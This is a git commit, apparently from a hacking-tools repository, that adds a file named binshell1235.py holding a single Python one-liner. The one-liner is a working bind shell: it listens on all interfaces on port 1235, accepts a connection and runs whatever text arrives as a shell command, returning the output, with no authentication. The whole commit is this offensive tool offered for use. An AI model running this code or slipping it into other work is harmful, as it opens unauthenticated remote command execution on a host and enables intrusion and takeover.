7abdbf9ad85e29ae466d68d21fa8be3fccbeddfa
Frozenk <newolf-hackworld@wanadoo.fr>
2024-02-28 15:07:57 +0100

    Add files via upload

---
+++ Linux/binshell1235.py
@@ -0,0 +1,2 @@
+python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1235));s1.listen(1);c,a=s1.accept();
+while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
